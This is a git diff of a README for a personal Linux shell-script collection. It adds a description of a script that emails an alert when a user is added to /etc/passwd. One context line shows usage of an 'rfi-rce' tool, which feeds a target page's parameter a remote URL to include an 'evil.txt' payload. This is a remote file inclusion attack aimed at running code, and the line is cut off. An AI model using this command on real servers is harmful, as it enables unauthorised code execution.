@@ -90,6 +90,8 @@ rfi-rce -f /var/www/html/evil.txt -u "http://target-ip/section.php?page=http://a
 ./MountDriveVMWworkstation.sh 
 ```
 
+- __newusercheck.sh__ This is a simple script to send an email alert whenever a new user is added to an /etc/passwd file on the local machine
+ 
 - __PreventSleeping.sh__ This is a simple script to prevent a Debian based Linux Distro from falling asleep
 ```sh
 ./PreventSleeping.sh
